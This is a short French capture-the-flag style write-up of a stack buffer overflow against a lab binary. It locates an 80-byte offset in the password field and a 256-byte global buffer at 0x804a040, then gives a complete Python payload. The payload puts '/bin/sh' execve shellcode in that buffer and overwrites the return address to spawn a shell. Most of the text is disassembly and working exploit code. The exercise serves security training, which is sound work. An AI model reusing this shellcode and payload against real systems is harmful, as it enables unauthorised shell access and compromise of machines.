On a l'offset pour buffer overflow de 80 dans le champ password apres avoir trouvé le user qui est dat_wil 

on a 256 de place dans le premier buffer on peut donc largement mettre notre shellcode on connait l'adresse du premier buffer 

   0x08048515 <+69>:	mov    %eax,0x8(%esp)
   0x08048519 <+73>:	movl   $0x100,0x4(%esp)
   0x08048521 <+81>:	movl   $0x804a040,(%esp)
   0x08048528 <+88>:	call   0x8048370 <fgets@plt>

0x804a040 car c'est le 3eme push qui représente le 1er arg

on y ajoute 7 pour dépasser "dat_wil" on execute on a un shell

shellcode = "dat_wil" + "1\xc0\xb0\xbe\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80"
password = "A" * 80 + "\x47\xa0\x04\x08"
payload = shellcode + "\n" + password

print(payload)
